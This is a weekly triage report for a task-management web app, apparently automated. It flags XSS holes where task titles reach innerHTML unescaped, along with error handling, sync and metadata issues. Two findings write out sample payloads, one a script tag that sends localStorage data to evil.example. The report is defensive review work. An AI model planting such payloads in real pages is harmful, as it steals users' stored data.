# Weekly Triage — 2026-09-13

## 📊 Week at a glance
- **Commits**: 2 | **Files changed**: 3 | **Debt markers added**: 0 (no TODO/FIXME/HACK/XXX found in changed files)
- **High-churn files**: `index.html` (touched in both commits this week), `givelink.html` (1 commit)
- **Debt pattern alert**: 15+ empty `catch(e){}` blocks in `index.html` — pre-existing but worth tagging

---

## 🚨 Needs immediate attention

### 1. `tcHTML` renders `t.title` unescaped into `innerHTML` — XSS in all task lists
- **File**: `index.html:3716`
- **Commit**: `72e03fe` (Givelink bug fixes and This Week view, 2026-09-12)
- **Why this matters**: Every rendered task list uses `tcHTML()`. A task whose title contains `<img onerror=alert(1)>` runs arbitrary JS. Since templates can be shared via URL (`?template=id`), a malicious shared template landing is a viable attack vector even in a personal app. The `esc()` helper exists at line 11776 but is not applied here. Also affects `renderWizPanel` at lines 3594 and 3601 — both introduced or touched in the same commit.

### 2. `renderWizPanel` (Weekly Review) injects `${t.title}` and `${g.title}` raw
- **File**: `index.html:3594`, `3601`, `3603`
- **Commit**: `72e03fe`
- **Why this matters**: The weekly review wizard re-renders task and goal titles into `innerHTML` without escaping. A task named `<script>fetch('https://evil.example?d='+localStorage.getItem('taskos'))</script>` would exfiltrate the entire local state on opening the review.

### 3. New `givelink.html` This Week view — no evidence of empty-state coverage
- **File**: `givelink.html` (entire file, 1829 lines)
- **Commit**: `72e03fe`
- **Why this matters**: The commit message says "This Week view" was added to givelink.html but the file contains no grep match for an empty state in the sprint columns (no `board-empty` equivalent or zero-task message in the new section). If the sprint has zero tasks in a column, the column renders blank with no CTA.

---

## 🧹 Cleanup opportunities

### 4. 15 empty `catch(e){}` blocks — silent failures scattered throughout boot sequence
- **File**: `index.html:2587, 2983, 3031, 3868, 3978, 3979, 3988, 4443, 5536, 10115, 10120, 10131, 10134`
- **Commit**: Pre-existing; present across many commits
- **Why this matters**: These suppress errors in guest nudge, emoji strip, weekly draft restore, confetti, first-win, XP award, logout cleanup, and post-login flows. Any regression in these paths is invisible in production. Minimum fix: `catch(e){console.warn('[label]', e)}`.

### 5. `window._procCelebrated`, `window._justWelcomed`, `window.__areteRendered` — ad-hoc global state
- **File**: `index.html:4443`, `10456`, `10686`, `10391`
- **Commit**: Pre-existing across several commits
- **Why this matters**: Four `window.*` runtime flags used as one-shot guards. External scripts (analytics, chat widget) could accidentally overwrite these, silently breaking first-run flow, analytics init, or the update banner. Consolidating into a `const _APP = {}` object costs 10 minutes.

### 6. `_wfCopy()` has no clipboard fallback for iOS Safari
- **File**: `index.html:5522`
- **Commit**: Pre-existing
- **Why this matters**: `navigator.clipboard.writeText` is blocked in non-secure contexts on iOS 15 and some Android WebViews. The copy button in AI Lab silently toasts "Copy failed" with no alternative. The pattern used elsewhere in the file (lines 10283, 1694 in givelink.html) already shows the correct `execCommand` fallback — just not applied here.

---

## 🤔 Worth a second look

### 7. `sbSyncNow()` called inside `online` event without retry — one-shot sync on reconnect
- **File**: `index.html:12591`
- **Commit**: Pre-existing
- **Why this matters**: When the device reconnects to the network, `sbSyncNow()` fires once. If that attempt fails (the Supabase project is momentarily cold-starting — relevant since the keep-alive workflow was added this week to prevent this exact condition), `_sbPending` stays `true` but no retry is scheduled. The sync pill stays red indefinitely until the user manually taps "Sync now." This may be intentional (letting the user control retries) but is worth verifying given that keeping the project warm is now an explicit concern.

### 8. Supabase keep-alive pings every 2 days — but the pause threshold is 7 days
- **File**: `.github/workflows/supabase-keepalive.yml`
- **Commit**: `160f0d8` (2026-09-12)
- **Why this matters**: The workflow comment says "well under the 7-day threshold." However, if GitHub Actions is delayed (queue, billing pause, weekend outage), a 2-day schedule could slip to 3 or more days without being noticed. Consider adding an `if: steps.ping.outcome != 'success'` alert step or reducing the schedule to daily — Actions minutes on free plans are generous and the curl is trivial.

### 9. Hardcoded Vercel preview URL in OG meta tags
- **File**: `index.html:29–30`
- **Commit**: Pre-existing
- **Why this matters**: `og:url` and `og:image` point to `https://task-management-beige-eight.vercel.app/` — the ephemeral preview hostname rather than a stable canonical domain. Social shares cards will break if the project is moved. Low urgency today but increasingly painful as social sharing is promoted (commits #74, #76, #78 added sharing flows).
